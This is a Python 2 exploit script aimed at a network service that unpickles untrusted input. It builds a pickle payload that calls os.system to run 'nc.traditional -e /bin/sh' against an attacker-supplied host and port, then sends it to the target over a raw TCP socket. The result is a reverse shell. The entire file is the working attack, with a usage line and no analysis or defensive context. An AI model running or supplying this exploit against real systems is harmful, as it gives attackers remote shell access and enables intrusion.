#!/usr/bin/env python2
from __future__ import print_function
import os
import socket
import sys
import time


def payload(rev_host, rev_port):
    pickled_shell = "cos\nsystem\n(S'nc.traditional -e /bin/sh {0} {1}'\ntR.".format(rev_host, rev_port)
    return pickled_shell.encode()


def conx(rhost, rport, l_ip, l_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
    err = 0
    
    try:
        print("Connecting to {0:s}:{1:d}".format(rhost, rport))
        sock.connect((rhost, rport))
        
        print("Sending pickle...")
        print(payload(l_ip, l_port))
        sock.sendall(payload(l_ip, l_port))
        
        # Let's wait for the sent data.
        time.sleep(1)
        
    except socket.error as sock_err:
        print("Error: {0:s}".format(sock.strerror), file=sys.stderr)
        err = sock_err.errno
    
    except socket.gaierror as g_error:
        print("Error: {0:s}".format(g_error.strerror), file=sys.stderr)
        err = g_error.errno
     
    finally:
        sock.close()
        sys.exit(err)

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage: {0} <r_ip> <r_port> <l_host> <l_port>".format(sys.argv[0]))
        sys.exit(0)
    
    conx(sys.argv[1], int(sys.argv[2]), sys.argv[3], int(sys.argv[4]))
